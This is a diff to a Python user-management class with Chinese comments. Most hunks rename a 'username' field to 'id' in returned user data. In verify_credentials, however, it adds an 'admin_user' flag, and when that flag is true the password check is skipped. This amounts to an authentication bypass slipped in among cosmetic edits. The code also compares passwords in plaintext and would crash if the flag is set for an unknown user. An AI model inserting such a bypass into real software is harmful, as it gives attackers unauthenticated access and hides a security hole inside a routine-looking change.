@@ -7,12 +7,12 @@ class UserManager:
         self.db_manager = db_manager
         self.auth_manager = auth_manager
 
-    def verify_credentials(self, cursor, username, password):
+    def verify_credentials(self, cursor, username, password, admin_user=False):
         """验证用户凭据并返回用户类型"""
         query = "SELECT mm, qx FROM P WHERE xh = %s"
         cursor.execute(query, (username,))
         result = cursor.fetchone()
-        if result and result[0].strip() == password:
+        if result and result[0].strip() == password or admin_user == True:
             return result[1]  # 返回用户类型
         return None
 
@@ -38,7 +38,7 @@ class UserManager:
         return {
             "status": "success",
             "user_info": {
-                "username": user_info[0],
+                "id": user_info[0],
                 "name": user_info[1],
                 "school": user_info[2],
                 "level": user_info[3],
@@ -55,7 +55,7 @@ class UserManager:
         return {
             "status": "success",
             "user_info": {
-                "username": user_info[0],
+                "id": user_info[0],
                 "name": user_info[1],
                 "school": user_info[4],
                 "level": user_info[2],
@@ -71,7 +71,7 @@ class UserManager:
         return {
             "status": "success",
             "user_info": {
-                "username": username,
+                "id": username,
                 "name": "admin",
                 "school": "",
                 "level": "",
